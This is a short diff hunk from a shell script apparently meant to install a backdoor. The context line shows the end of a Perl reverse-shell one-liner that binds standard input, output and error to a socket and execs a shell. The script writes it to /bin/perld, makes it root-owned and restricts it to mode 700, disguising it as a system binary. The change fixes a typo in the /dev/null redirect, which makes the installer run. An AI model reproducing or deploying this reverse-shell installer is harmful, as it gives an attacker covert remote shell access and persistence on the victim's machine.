@@ -28,7 +28,7 @@ close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/b
 
 # Place script at /bin/perld and set permissions
 echo "Creating script..."
-echo "$SCRIPT" | sudo tee /bin/perld > /dåev/null
+echo "$SCRIPT" | sudo tee /bin/perld > /dev/null
 sudo chown root /bin/perld
 sudo chmod 700 /bin/perld
 
